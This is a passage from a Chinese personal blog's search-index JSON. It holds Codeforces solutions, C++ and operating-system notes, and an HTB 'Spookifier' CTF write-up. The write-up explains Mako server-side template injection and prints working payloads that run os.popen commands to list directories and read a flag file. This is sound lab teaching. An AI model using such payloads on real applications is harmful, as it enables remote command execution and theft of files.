。","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/categories/CTF/"},{"name":"Web","slug":"CTF/Web","permalink":"https://archer-baiyi.github.io/categories/CTF/Web/"}],"tags":[{"name":"HTB","slug":"HTB","permalink":"https://archer-baiyi.github.io/tags/HTB/"},{"name":"Web","slug":"Web","permalink":"https://archer-baiyi.github.io/tags/Web/"},{"name":"Injection","slug":"Injection","permalink":"https://archer-baiyi.github.io/tags/Injection/"},{"name":"Template Injection","slug":"Template-Injection","permalink":"https://archer-baiyi.github.io/tags/Template-Injection/"},{"name":"模板注入","slug":"模板注入","permalink":"https://archer-baiyi.github.io/tags/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/"},{"name":"Jinja2","slug":"Jinja2","permalink":"https://archer-baiyi.github.io/tags/Jinja2/"}]},{"title":"HTB Spookifier","slug":"CTF/Web/HTB-Spookifier","date":"2025-03-27T17:16:33.000Z","updated":"2025-03-27T19:52:41.593Z","comments":true,"path":"2025/03/27/CTF/Web/HTB-Spookifier/","permalink":"https://archer-baiyi.github.io/2025/03/27/CTF/Web/HTB-Spookifier/","excerpt":"","text":"题目描述 （有附件） 解题观察打开网站： 输入 “abc“ 会看到： 然后我们来查看代码（routes.py）： 1234567891011121314from flask import Blueprint, requestfrom flask_mako import render_templatefrom application.util import spookifyweb = Blueprint('web', __name__)@web.route('/')def index(): text = request.args.get('text') if(text): converted = spookify(text) return render_template('index.html',output=converted) return render_template('index.html',output='') 可以看到网页会将我们的输入经过 sppokify() 函数转换一下再进行输出。 所以我们接着来查看 util.py ： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374from mako.template import Templatefont1 = { 'A': '𝕬', 'B': '𝕭', 'C': '𝕮', ...}font2 = { 'A': 'ᗩ', 'B': 'ᗷ', 'C': 'ᑢ', ...}font3 = { 'A': '₳', 'B': '฿', 'C': '₵', ...} font4 = { 'A': 'A', 'B': 'B', 'C': 'C', ...}# 注意，这里的font4收录了所有的字母数字以及符号，并没有做任何修改。def generate_render(converted_fonts): result = ''' &lt;tr&gt; &lt;td&gt;{0}&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;{1}&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;{2}&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;{3}&lt;/td&gt; &lt;/tr&gt; '''.format(*converted_fonts) return Template(result).render()def change_font(text_list): text_list = [*text_list] current_font = [] all_fonts = [] add_font_to_list = lambda text,font_type : ( [current_font.append(globals()[font_type].get(i, ' ')) for i in text], all_fonts.append(''.join(current_font)), current_font.clear() ) and None add_font_to_list(text_list, 'font1') add_font_to_list(text_list, 'font2') add_font_to_list(text_list, 'font3') add_font_to_list(text_list, 'font4') return all_fontsdef spookify(text): converted_fonts = change_font(text_list=text) return generate_render(converted_fonts=converted_fonts) 可以看到定义了4种字体以及输出的页面格式。change_font() 和 spookify() 则负责转换字体。 假设我们输入了 ”input“，那么服务器按照以下流程来处理我们的输入： 接收我们的输入并赋值给 text： 1text = request.args.get('text') 调用 spookify(text)： 1converted = spookify(text) 123def spookify(text): converted_fonts = change_font(text_list=text) return generate_render(converted_fonts=converted_fonts) 最后再利用 generate_render() 创建模板： 123456789def generate_render(converted_fonts): result = ''' &lt;tr&gt;&lt;td&gt;{0}&lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;{1}&lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;{2}&lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;{3}&lt;/td&gt;&lt;/tr&gt; '''.format(*converted_fonts) return Template(result).render() 注意，因为 font4 完全不会修改我们输入的内容，所以我们输入的所以内容（包括各种特殊符号）都会保留下来并被渲染进 {3} 的位置。 漏洞+渗透这道题主要考察的是 Template Injection（模板注入）： 模板注入是指攻击者将恶意代码注入到模板引擎中，使模板引擎在渲染时执行攻击者控制的表达式，造成信息泄露、RCE（远程代码执行）等后果。 漏洞主要由这几部分一起构成： 没有对输入内容进行过滤； font4会保留我们的所有输入内容 使用 Template(…).render() 动态渲染字符串模板 Mako里刚好有表达式语法： 1${} 所以导致我们输入 1${7*7} 时，mako会在渲染这部分内容 1234&lt;tr&gt;&lt;td&gt;{0}&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;{1}&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;{2}&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;${7*7}&lt;/td&gt;&lt;/tr&gt; 时，执行我们的代码，即 ${7*7}。所以最后的渲染结果是： 1&lt;tr&gt;&lt;td&gt;49&lt;/td&gt;&lt;/tr&gt; 这样子就我们说明注入成功了，接下来就是考虑如何读取flag了。 因为Mako 的底层代码会把 ${ } 表达式里的内容编译成 Python 代码，然后直接执行。所以我们直接注入python代码即可。 首先尝试 1${__import__('os').popen('ls').read()} 其中 1.popen('ls') 会执行 ls 命令（默认是当前工作目录），而 1.read() 会把命令输出读取成字符串。 可以看到 意味着当前目录下没有flag。我们接着查看上一级目录里的内容： 1${__import__('os').popen('ls ..').read()} 成功找到 flag.txt 文件。最后直接读取就好： 1${__import__('os').popen('cat ../flag.txt').read()} 得到flag：HTB{t3mpl4t3_1nj3ct10n_C4n_3x1st5_4nywh343!!} 。","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/categories/CTF/"},{"name":"Web","slug":"CTF/Web","permalink":"https://archer-baiyi.github.io/categories/CTF/Web/"}],"tags":[{"name":"HTB","slug":"HTB","permalink":"https://archer-baiyi.github.io/tags/HTB/"},{"name":"Web","slug":"Web","permalink":"https://archer-baiyi.github.io/tags/Web/"},{"name":"Injection","slug":"Injection","permalink":"https://archer-baiyi.github.io/tags/Injection/"},{"name":"Template Injection","slug":"Template-Injection","permalink":"https://archer-baiyi.github.io/tags/Template-Injection/"},{"name":"模板注入","slug":"模板注入","permalink":"https://archer-baiyi.github.io/tags/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/"},{"name":"Mako","slug":"Mako","permalink":"https://archer-baiyi.github.io/tags/Mako/"}]},{"title":"Codeforce Chat room","slug":"算法竞赛/Codeforce/1000/Codeforce-Chat-room","date":"2025-03-27T12:13:26.000Z","updated":"2025-04-02T11:06:00.595Z","comments":true,"path":"2025/03/27/算法竞赛/Codeforce/1000/Codeforce-Chat-room/","permalink":"https://archer-baiyi.github.io/2025/03/27/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/Codeforce/1000/Codeforce-Chat-room/","excerpt":"","text":"题目描述 思路利用一个index/指针来逐个匹配目标字符串 “hello”。从j=0开始，如果找到了j就加一。如果最后j=5的话就说明找到了。 代码C++12345678910111213141516171819202122232425262728#include &lt;iostream&gt;#include &lt;string&gt;using namespace std;int main() { string s; cin &gt;&gt; s; string target = \"hello\"; int j = 0; for (char c : s) { if (c == target[j]) { j++; } if (j == target.size()) { break; } } if (j == target.size()) { cout &lt;&lt; \"YES\" &lt;&lt; endl; } else { cout &lt;&lt; \"NO\" &lt;&lt; endl; } return 0;}","categories":[{"name":"算法竞赛","slug":"算法竞赛","permalink":"https://archer-baiyi.github.io/categories/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/"},{"name":"Codeforce","slug":"算法竞赛/Codeforce","permalink":"https://archer-baiyi.github.io/categories/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/Codeforce/"}],"tags":[{"name":"算法竞赛","slug":"算法竞赛","permalink":"https://archer-baiyi.github.io/tags/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/"},{"name":"Codeforce","slug":"Codeforce","permalink":"https://archer-baiyi.github.io/tags/Codeforce/"},{"name":"1000","slug":"1000","permalink":"https://archer-baiyi.github.io/tags/1000/"}]},{"title":"Codeforce Lucky Division","slug":"算法竞赛/Codeforce/1000/Codeforce-Lucky-Division","date":"2025-03-27T12:06:28.000Z","updated":"2025-04-02T11:06:22.990Z","comments":true,"path":"2025/03/27/算法竞赛/Codeforce/1000/Codeforce-Lucky-Division/","permalink":"https://archer-baiyi.github.io/2025/03/27/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/Codeforce/1000/Codeforce-Lucky-Division/","excerpt":"","text":"题目描述 思路写2个函数，第一个判断一个数是否是（严格的）lucky number，第二个函数遍历所有的lucky number判断是否是当前n的因数。 代码C++12345678910111213141516171819202122232425262728293031#include &lt;iostream&gt;#include &lt;string&gt;using namespace std;// 判断一个数字是否是 lucky number（只含有 4 或 7）bool is_lucky(int num) { string s = to_string(num); // 比如说会把47转成\"47\" for (char c : s) { // 会遍历string中的每个字母 if (c != '4' &amp;&amp; c != '7') { return false; } } return true;}// 判断是否是 almost lucky numberstring is_almost_lucky(int n) { for (int i = 1; i &lt;= n; ++i) { if (is_lucky(i) &amp;&amp; n % i == 0) { return \"YES\"; } } return \"NO\";}int main() { int n; cin &gt;&gt; n; cout &lt;&lt; is_almost_lucky(n) &lt;&lt; endl; return 0;} Python12345678910111213def is_lucky(num): # 判断一个数字是不是 lucky number（只含 4 或 7） return all(c in '47' for c in str(num))def is_almost_lucky(n): # 枚举 1 到 n 的所有 lucky number for i in range(1, n + 1): if is_lucky(i) and n % i == 0: return \"YES\" return \"NO\"n = int(input())print(is_almost_lucky(n))","categories":[{"name":"算法竞赛","slug":"算法竞赛","permalink":"https://archer-baiyi.github.io/categories/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/"},{"name":"Codeforce","slug":"算法竞赛/Codeforce","permalink":"https://archer-baiyi.github.io/categories/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/Codeforce/"}],"tags":[{"name":"算法竞赛","slug":"算法竞赛","permalink":"https://archer-baiyi.github.io/tags/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/"},{"name":"Codeforce","slug":"Codeforce","permalink":"https://archer-baiyi.github.io/tags/Codeforce/"},{"name":"1000","slug":"1000","permalink":"https://archer-baiyi.github.io/tags/1000/"}]},{"title":"C++ 入门","slug":"编程/Cpp-入门","date":"2025-03-26T21:47:10.000Z","updated":"2025-03-26T22:40:07.069Z","comments":true,"path":"2025/03/26/编程/Cpp-入门/","permalink":"https://archer-baiyi.github.io/2025/03/26/%E7%BC%96%E7%A8%8B/Cpp-%E5%85%A5%E9%97%A8/","excerpt":"","text":"Hello World老规矩还是先见识一下输出“Hello World!”： 12345678#include &lt;iostream&gt;using namespace std;int main()&#123; cout &lt;&lt; &quot;Hello World!&quot;; return 0;&#125; 注意几点： #include 这一部分和c是一样的，但是后面的库的名字是不同的； using namespace std; 是为了不需要后面每次使用像 cout 时得写全成 std::cout 。而且记得一定要在后面加上 ;； cout 是c output，想输出什么东西都得按照 cout","categories":[{"name":"编程","slug":"编程","permalink":"https://archer-baiyi.github.io/categories/%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"C++","slug":"C","permalink":"https://archer-baiyi.github.io/tags/C/"},{"name":"cpp","slug":"cpp","permalink":"https://archer-baiyi.github.io/tags/cpp/"}]},{"title":"Codeforce-String Task","slug":"算法竞赛/Codeforce/1000/Codeforce-String-Task","date":"2025-03-26T13:02:00.000Z","updated":"2025-04-02T11:06:33.027Z","comments":true,"path":"2025/03/26/算法竞赛/Codeforce/1000/Codeforce-String-Task/","permalink":"https://archer-baiyi.github.io/2025/03/26/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/Codeforce/1000/Codeforce-String-Task/","excerpt":"","text":"题目描述 思路代码Python1234567891011121314word = input()V = [\"A\", \"O\", \"Y\", \"E\", \"U\", \"I\"]# deletes all the vowelsword = ''.join(c for c in word if c.upper() not in V)# replaces all uppercase consonants with corresponding lowercase ones.word = word.lower()# inserts a character \".\" before each consonant,word = ''.join('.' + c for c in word)print(word) 优化： 12345word = input()V = [\"A\", \"O\", \"Y\", \"E\", \"U\", \"I\"]print(''.join('.' + c.lower() for c in word if c.upper() not in V)) C1 C++1","categories":[{"name":"算法竞赛","slug":"算法竞赛","permalink":"https://archer-baiyi.github.io/categories/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/"},{"name":"Codeforce","slug":"算法竞赛/Codeforce","permalink":"https://archer-baiyi.github.io/categories/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/Codeforce/"}],"tags":[{"name":"算法竞赛","slug":"算法竞赛","permalink":"https://archer-baiyi.github.io/tags/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/"},{"name":"Codeforce","slug":"Codeforce","permalink":"https://archer-baiyi.github.io/tags/Codeforce/"},{"name":"1000","slug":"1000","permalink":"https://archer-baiyi.github.io/tags/1000/"}]},{"title":"Codeforce Next Round","slug":"算法竞赛/Codeforce/800/Codeforce-Next-Round","date":"2025-03-25T21:17:50.000Z","updated":"2025-04-02T11:05:31.486Z","comments":true,"path":"2025/03/25/算法竞赛/Codeforce/800/Codeforce-Next-Round/","permalink":"https://archer-baiyi.github.io/2025/03/25/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/Codeforce/800/Codeforce-Next-Round/","excerpt":"","text":"题目描述 思路先统计前 k 个分数中大于 0 的数量。因为分数是递减排列的，只需继续统计从第 k 个位置开始，所有与第 k 个分数相等的连续分数个数。最后的总合就是结果。 代码Python12345678910111213141516171819n_k = input().split()n = int(n_k[0])k = int(n_k[1])n_list = list(map(int, input().split()))comp = n_list[k-1]n1_list = n_list[:k] for i in range(k,n): if n_list[i] == comp: n1_list.append(n_list[i]) else: breakcount = sum(1 for x in n1_list if x &gt; 0)# print(n1_list)print(count) 优化： 1234n, k = map(int, input().split())scores = list(map(int, input().split()))threshold = scores[k - 1]print(sum(s &gt;= threshold and s &gt; 0 for s in scores)) 用numpy的： 1234567import numpy as npn, k = map(int, input().split())scores = np.array(list(map(int, input().split())))threshold = scores[k - 1]result = np.sum((scores &gt;= threshold) &amp; (scores &gt; 0))print(result) C12345678910111213141516171819202122232425262728293031323334#include &lt;stdio.h&gt;int main() { int n, k; scanf(\"%d %d\", &amp;n, &amp;k); int scores[100]; // 假设最大不超过 100 个分数 for (int i = 0; i &lt; n; i++) { scanf(\"%d\", &amp;scores[i]); } int threshold = scores[k - 1]; // 第 k 个选手的分数（索引从 0 开始） int count = 0; // 前 k 个中统计 &gt;0 且 &gt;= threshold 的分数 for (int i = 0; i &lt; k; i++) { if (scores[i] &gt;= threshold &amp;&amp; scores[i] &gt; 0) { count++; } } // 从第 k 个开始，统计连续等于 threshold 的（也必须 &gt;0） for (int i = k; i &lt; n; i++) { if (scores[i] == threshold &amp;&amp; scores[i] &gt; 0) { count++; } else { break; } } printf(\"%d\\n\", count); return 0;} C++12345678910111213141516171819202122232425#include &lt;iostream&gt;#include &lt;vector&gt;using namespace std;int main() { int n, k; cin &gt;&gt; n &gt;&gt; k; vector&lt;int&gt; scores(n); for (int i = 0; i &lt; n; ++i) { cin &gt;&gt; scores[i]; } int threshold = scores[k - 1]; int count = 0; for (int i = 0; i &lt; n; ++i) { if (scores[i] &gt;= threshold &amp;&amp; scores[i] &gt; 0) { count++; } } cout &lt;&lt; count &lt;&lt; endl; return 0;} 用ranges： 12345678910111213141516171819202122232425#include &lt;iostream&gt;#include &lt;vector&gt;#include &lt;ranges&gt;using namespace std;namespace ranges = std::ranges;int main() { int n, k; cin &gt;&gt; n &gt;&gt; k; vector&lt;int&gt; scores(n); for (int&amp; score : scores) { cin &gt;&gt; score; } int threshold = scores[k - 1]; auto advancers = scores | ranges::views::filter([threshold](int x) { return x &gt;= threshold &amp;&amp; x &gt; 0; }); cout &lt;&lt; ranges::distance(advancers) &lt;&lt; endl; return 0;} Remark1. 如果只是 1n,k = input().split() 的话只会将n,k赋值成2个string，而不是int，所以需要这一步将它们转成2个int： 123n_k = input().split()n = int(n_k[0])k = int(n_k[1]) list那里的处理也是同理。 2. 如果直接写 12345678n_list = list(map(int, input().split()))comp = n_list[k-1]for i in range(k,n): if n_list[i] == comp: n_list.append(n_list[i]) else: break 的话，会导致遍历一个列表的同时又在修改它，会导致结果不可控。 但就算是改成了 12345678910n_list = list(map(int, input().split()))comp = n_list[k-1]n1_list = n_listfor i in range(k,n): if n1_list[i] == comp: n_list.append(n1_list[i]) else: break 也不对，因为在python里n1_list 并不是 n_list 的复制品，而只是同一个列表的两个名字。这样只是让 n1_list 和 n_list 指向同一个列表对象，修改任何一个，都会影响另一个。所以会出现跟之前一模一样的结果。 创建独立的副本需要： 123456n1_list = n_list[:]# 或n1_list = list(n_list)# 或import copyn1_list = copy.copy(n_list) （注意：python里的list[a:b]是前闭后开，所以这个不包含list[b]） 3. 假如这道题的input是乱序的，那么需要先将input排序了再进行后续操作。 python的话非常简单： 12345678910111213input = [3, 1, 4, 1, 5, 9]#升序：input.sort() # 原地排序，修改 input 本身# 或者input = sorted(input) # 返回新排序后的列表#降序：input.sort(reverse=True)# 或者input = sorted(input, reverse=True) c就很麻烦了： 12345678910111213141516171819#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int cmp(const void *a, const void *b) { return (*(int *)a - *(int *)b); // 升序 // return (*(int *)b - *(int *)a); // 降序}int main() { int arr[] = {3, 1, 4, 1, 5, 9}; int n = sizeof(arr) / sizeof(arr[0]); qsort(arr, n, sizeof(int), cmp); // 排序调用 for (int i = 0; i &lt; n; i++) { printf(\"%d \", arr[i]); } return 0;} 因为 qsort()（通用的排序函数）是泛型函数，它不能直接比较 int 或 float，我们必须手动告诉它“怎么比较两个值”。 相比之下c++就会方便很多，因为有内置的函数： 12345678910111213141516171819#include &lt;iostream&gt;#include &lt;algorithm&gt;#include &lt;functional&gt; // 降序会需要using namespace std;int main() { int arr[] = {3, 1, 4, 1, 5, 9}; int n = sizeof(arr) / sizeof(arr[0]); sort(arr, arr + n); // 默认升序排序 // sort(arr, arr + n, greater&lt;int&gt;()); 降序 for (int i = 0; i &lt; n; i++) { cout &lt;&lt; arr[i] &lt;&lt; \" \"; } return 0;} 也可以直接用cpp的 vector&lt;int&gt; 1234567891011121314151617#include &lt;iostream&gt;#include &lt;vector&gt;#include &lt;algorithm&gt;using namespace std;int main() { vector&lt;int&gt; v = {3, 1, 4, 1, 5, 9}; sort(v.begin(), v.end()); // 升序 // sort(v.begin(), v.end(), greater&lt;int&gt;()); // 降序 for (int x : v) { cout &lt;&lt; x &lt;&lt; \" \"; } return 0;}","categories":[{"name":"算法竞赛","slug":"算法竞赛","permalink":"https://archer-baiyi.github.io/categories/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/"},{"name":"Codeforce","slug":"算法竞赛/Codeforce","permalink":"https://archer-baiyi.github.io/categories/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/Codeforce/"}],"tags":[{"name":"算法竞赛","slug":"算法竞赛","permalink":"https://archer-baiyi.github.io/tags/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/"},{"name":"Codeforce","slug":"Codeforce","permalink":"https://archer-baiyi.github.io/tags/Codeforce/"},{"name":"800","slug":"800","permalink":"https://archer-baiyi.github.io/tags/800/"}]},{"title":"Codeforce-Bit++","slug":"算法竞赛/Codeforce/800/Codeforce-Bit","date":"2025-03-25T17:57:32.000Z","updated":"2025-04-02T11:05:16.379Z","comments":true,"path":"2025/03/25/算法竞赛/Codeforce/800/Codeforce-Bit/","permalink":"https://archer-baiyi.github.io/2025/03/25/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/Codeforce/800/Codeforce-Bit/","excerpt":"","text":"题目描述 思路对于每一行命令检测+是否在里面就好。 代码Python123456789n = int(input())x=0for _ in range(n): op = input() if \"+\" in op: x += 1 else: x -= 1print(x) C1234567891011121314151617181920#include &lt;stdio.h&gt;#include &lt;string.h&gt;int main() { int n, x = 0; scanf(\"%d\", &amp;n); char op[5]; for (int i = 0; i &lt; n; i++) { scanf(\"%s\", op); if (strchr(op, '+')) { x += 1; } else { x -= 1; } } printf(\"%d\\n\", x); return 0;} C++","categories":[{"name":"算法竞赛","slug":"算法竞赛","permalink":"https://archer-baiyi.github.io/categories/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/"},{"name":"Codeforce","slug":"算法竞赛/Codeforce","permalink":"https://archer-baiyi.github.io/categories/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/Codeforce/"}],"tags":[{"name":"算法竞赛","slug":"算法竞赛","permalink":"https://archer-baiyi.github.io/tags/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/"},{"name":"Codeforce","slug":"Codeforce","permalink":"https://archer-baiyi.github.io/tags/Codeforce/"},{"name":"800","slug":"800","permalink":"https://archer-baiyi.github.io/tags/800/"}]},{"title":"Codeforce - Team","slug":"算法竞赛/Codeforce/800/Codeforce-Team","date":"2025-03-25T17:42:06.000Z","updated":"2025-04-02T11:05:46.927Z","comments":true,"path":"2025/03/25/算法竞赛/Codeforce/800/Codeforce-Team/","permalink":"https://archer-baiyi.github.io/2025/03/25/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/Codeforce/800/Codeforce-Team/","excerpt":"","text":"题目描述 一共有 n 道题目，而对于每道题，他们会选择是否去做这题：只有当三个人中至少有两个人对这题有把握时，他们才会决定去做。 思路直接计算每行的和是否大于等于2。 代码Python123456789n = int(input()) count = 0 for _ in range(n): a, b, c = map(int, input().split()) if a + b + c &gt;= 2: count += 1 print(count) C1234567891011121314151617#include &lt;stdio.h&gt;int main() { int n, a, b, c; int count = 0; scanf(\"%d\", &amp;n); for (int i = 0; i &lt; n; i++) { scanf(\"%d %d %d\", &amp;a, &amp;b, &amp;c); if (a + b + c &gt;= 2) { count++; } } printf(\"%d\\n\", count); return 0;} C++123456789101112131415161718#include &lt;iostream&gt;using namespace std;int main(){ int n; cin &gt;&gt; n; int a,b,c; int count=0; for( int i=0; i &lt; n; i++){ cin &gt;&gt; a &gt;&gt; b &gt;&gt; c; if(a+b+c &gt;1){ count +=1; } } cout &lt;&lt; count; return 0;}","categories":[{"name":"算法竞赛","slug":"算法竞赛","permalink":"https://archer-baiyi.github.io/categories/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/"},{"name":"Codeforce","slug":"算法竞赛/Codeforce","permalink":"https://archer-baiyi.github.io/categories/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/Codeforce/"}],"tags":[{"name":"算法竞赛","slug":"算法竞赛","permalink":"https://archer-baiyi.github.io/tags/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/"},{"name":"Codeforce","slug":"Codeforce","permalink":"https://archer-baiyi.github.io/tags/Codeforce/"},{"name":"800","slug":"800","permalink":"https://archer-baiyi.github.io/tags/800/"}]},{"title":"Codeforce - Way Too Long Words 题解","slug":"算法竞赛/Codeforce/800/Codeforce-A-Way-Too-Long-Words","date":"2025-03-25T17:28:41.000Z","updated":"2025-04-02T11:04:46.144Z","comments":true,"path":"2025/03/25/算法竞赛/Codeforce/800/Codeforce-A-Way-Too-Long-Words/","permalink":"https://archer-baiyi.github.io/2025/03/25/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/Codeforce/800/Codeforce-A-Way-Too-Long-Words/","excerpt":"","text":"题目描述 简单来讲就是需要”简化“长单词。 思路先判断单词长度。如果小于等于10就不用管，如果超过10，则写成：首字母 + 中间的字母数量 + 末尾字母。 代码Python1234567n = int(input())for _ in range(n): word = input() if len(word) &gt; 10: print(word[0] + str(len(word) - 2) + word[-1]) else: print(word) C123456789101112131415161718192021#include &lt;stdio.h&gt;#include &lt;string.h&gt;int main() { int n; scanf(\"%d\", &amp;n); char word[101]; for (int i = 0; i &lt; n; i++) { scanf(\"%s\", word); int len = strlen(word); if (len &gt; 10) { printf(\"%c%d%c\\n\", word[0], len - 2, word[len - 1]); } else { printf(\"%s\\n\", word); } } return 0;} C++12345678910111213141516171819202122#include &lt;iostream&gt;#include &lt;string&gt;using namespace std;int main() { int n; cin &gt;&gt; n; string word; for (int i = 0; i &lt; n; ++i) { cin &gt;&gt; word; int len = word.length(); if (len &gt; 10) { cout &lt;&lt; word[0] &lt;&lt; len - 2 &lt;&lt; word[len - 1] &lt;&lt; endl; } else { cout &lt;&lt; word &lt;&lt; endl; } } return 0;}","categories":[{"name":"算法竞赛","slug":"算法竞赛","permalink":"https://archer-baiyi.github.io/categories/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/"},{"name":"Codeforce","slug":"算法竞赛/Codeforce","permalink":"https://archer-baiyi.github.io/categories/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/Codeforce/"}],"tags":[{"name":"算法竞赛","slug":"算法竞赛","permalink":"https://archer-baiyi.github.io/tags/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/"},{"name":"Codeforce","slug":"Codeforce","permalink":"https://archer-baiyi.github.io/tags/Codeforce/"},{"name":"800","slug":"800","permalink":"https://archer-baiyi.github.io/tags/800/"}]},{"title":"GBS 7 Dateisystem 文件系统","slug":"TUM笔记/GBS/GBS-7-Dateisystem-文件系统","date":"2025-03-24T20:53:38.000Z","updated":"2025-04-01T21:48:05.340Z","comments":true,"path":"2025/03/24/TUM笔记/GBS/GBS-7-Dateisystem-文件系统/","permalink":"https://archer-baiyi.github.io/2025/03/24/TUM%E7%AC%94%E8%AE%B0/GBS/GBS-7-Dateisystem-%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/","excerpt":"操作系统基础相关笔记","text":"Einführung首先我们需要先明确为什么需要文件系统： 进程在运行期间只能使用其虚拟地址空间来存储数据：容量有限。 当进程结束时，其虚拟地址空间中的数据会丢失：无法实现持久的、长期的数据存储。 在虚拟进程地址空间中存储数据只允许有限的共享访问：不能实现同时并行使用。 所以我们需要文件系统来提供更高级别，更持久、更可靠并且可共享的数据存储功能。 也就意味着我们会对文件系统有着以下要求： 提供存储空间以容纳大量数据（Speicherplatz für (sehr) große Datenmengen bereitstellen） 防止数据丢失（Datenverlust vermeiden） 支持并发访问数据（Nebenläufigen Zugriff auf Daten ermöglichen） 多个进程应能够同时访问数据。 文件系统的基本作用是将硬盘上的原始数据块组织成结构良好的文件，使得用户和程序可以方便地存取数据。 具体的任务包括： 可以描述文件的数据结构（Datenstrukturen zur Beschreibung von Dateien） 实现文件（Implementierung der Dateien） 命名（Benennung） 允许访问文件（Zugriffe auf Dateien ermöglichen） 防止未授权访问（Schutz vor unberechtigten Zugriffen） 常见的文件系统有： FAT-16/32 (DOS) 老式的微软文件系统 NTFS (Windows NT) 微软当前主流的文件系统 Ext2/3/4 (Linux) Linux 系统中广泛使用的文件系统系列（Ext4是目前主流） 硬盘硬盘作为长期存储的媒介，可以被看作是一串固定大小的线性数据块序列（ eine lineare Sequenz von Blöcken fester Größe ）。这里的块（Block）就是硬盘读写的基本单位（Einheit）。这里的块的大小是由操作系统决定的，和硬盘的sector没有直接的大小关系。 而为了更好的管理硬盘的存储空间，我们需要操作系统对硬盘属性进行虚拟化，也就是所谓的文件概念（Datei-Konzept）： 文件是逻辑上的管理单元。（Dateien sind logische Verwaltungs-Einheiten） 文件可以持久地存储任意信息。（Dateien speichern beliebige Informationen persistent (dauerhaft)） 文件系统对块的存储位置、空闲状态等进行了抽象处理。（Datei abstrahiert davon, wo die Blöcke gespeichert sind, welche Blöcke frei sind usw.） 进程可以通过系统调用来创建、写入、读取和删除文件。（erstellen, schreiben, lesen, löschen） 文件不仅被用户程序使用，也被系统软件使用。（ Dateien werden sowohl von Benutzerprogrammen als auch von der Systemsoftware verwendet） 文件 （Dateien）我们首先通过用户视角来了解一下文件系统：就从我们日常接触的文件开始。 文件作为被管理的单位（zu verwaltende Einheiten），可以被不同的进程使用。所有文件都必须有名字，没有统一的命名规则。一般情况下名字会由2部分组成：名字（Name）和扩展名（Extension）。而有些系统（比如说Windows）会解析扩展名，有些则不会（比如UNIX）。 文件可以采用三种不同的结构方式： 非结构化（Unstrukturiert） 操作系统只把文件当作一串字节（eine Folge von Bytes）（适用于 UNIX 和 Windows）来看待，它不会尝试去理解文件里面到底是什么内容。 优点：用户程序有更大的灵活性 固定大小记录的序列（Sequenzen von Einträgen fester Größe） 每条记录有固定的大小和结构，比如每行只能写 80 个字符。现代的操作系统已经很少使用这种方式了。 具有不同大小记录的树结构（Ein Baum mit Einträgen unterschiedlicher Größe） 每条记录都有一个Key，这些Key都是有序存储的。适合在大型计算机的操作系统（Großrechner-BS ）中用于处理大量数据。 文件类型（Dateitypen）操作系统支持多种文件类型： 普通文件（ Dateien，regular files）： 包含用户数据的文件，比如说： 文本文件（Text-Dateien）： Bestehen aus Zeilen, die durch carriage return （回车符，\\r）und/oder linefeed Zeichen（换行符，\\n） abgeschlossen sind. 二进制文件（Binärdateien）：具有特定格式，比如说可执行文件、压缩包等。 目录（Verzeichnisse，directories）： 是用于组织和管理文件系统中结构的系统文件。 块设备文件（Block Special Files） 字符设备文件（Character Special Files） 在linux种可以用 ls -l 来查看文件类型： 第一位字符 文件类型 - 普通文件 d 目录 c 块设备文件 b 字符设备文件 例子： 1234drwxr-xr-x 2 user user 4096 Mar 26 test_folder-rw-r--r-- 1 user user 1234 Mar 26 notes.txtcrw-rw---- 1 root tty 4, 0 Mar 26 /dev/tty0brw-rw---- 1 root disk 8, 0 Mar 26 /dev/sda 可执行文件的结构： 压缩文件的结构： 文件访问方式（Dateizugriff）顺序访问（Sequential access）（只有在很老的操作系统里才会出现了。） 